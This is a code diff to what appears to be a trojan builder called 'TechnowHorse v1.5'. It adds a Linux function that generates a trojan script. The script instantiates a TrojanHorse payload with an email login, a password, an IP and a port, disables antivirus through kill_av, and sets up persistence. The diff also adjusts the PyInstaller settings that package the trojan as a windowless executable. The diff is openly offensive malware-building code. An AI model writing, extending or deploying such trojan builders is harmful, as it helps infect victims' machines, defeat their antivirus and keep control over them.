@@ -13,7 +13,7 @@ BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m'
 if platform.system() == 'Windows':
     PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")
 elif platform.system() == 'Linux':
-    PYTHON_PYINSTALLER_PATH = os.path.expanduser("~/.wine/drive_c/Python37/Scripts/pyinstaller.exe")
+    PYTHON_PYINSTALLER_PATH = os.path.expanduser("~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe")
 
 def get_options():
     parser = argparse.ArgumentParser(description=f'{RED}TechnowHorse v1.5')
@@ -88,7 +88,20 @@ def create_trojan(file_name, email, password, ip, port, time_persistent, legitim
             file.write("\t\ttechnowHorse.kill_av()\n")             
         file.write(f"\t\ttechnowHorse.become_persistent({time_persistent})\n") 
         file.write("\t\ttechnowHorse.start()\n\n")     
-        file.write("check_and_start()\n")          
+        file.write("check_and_start()\n")   
+
+def create_trojan_linux(file_name, email, password, ip, port, time_persistent):    
+    with open(file_name, "w+") as file:
+        file.write("import payload\n")
+        
+        file.write(f"technowHorse = payload.TrojanHorse(\'{email}\', \'{password}\', \'{ip}\', {port})\n")
+        if arguments.kill_av != None and arguments.kill_av != "":
+            file.write(f"technowHorse.kill_av({arguments.kill_av})\n") 
+        else:
+            file.write("technowHorse.kill_av()\n")             
+        file.write(f"technowHorse.become_persistent({time_persistent})\n") 
+        file.write("technowHorse.start()\n\n")     
+                
         
 def obfuscating_payload(file_name):
     gen = DocumentGenerator()
@@ -103,7 +116,7 @@ def compile_for_windows(file_name):
         subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload {file_name} -i {arguments.icon}", shell=True)
 
 def compile_for_linux(file_name):
-    subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload {file_name} -i {arguments.icon}", shell=True)
+    subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=payload {file_name} -i {arguments.icon}", shell=True)
     
 def del_junk_file(file_name):
     try:
@@ -206,7 +219,4 @@ if __name__ == '__main__':
     
     except KeyboardInterrupt:        
         exit_greet()
-    
-   
-    except Exception as e:
-        print(f"\n{RED}[!] Error : {e}")    
+ 
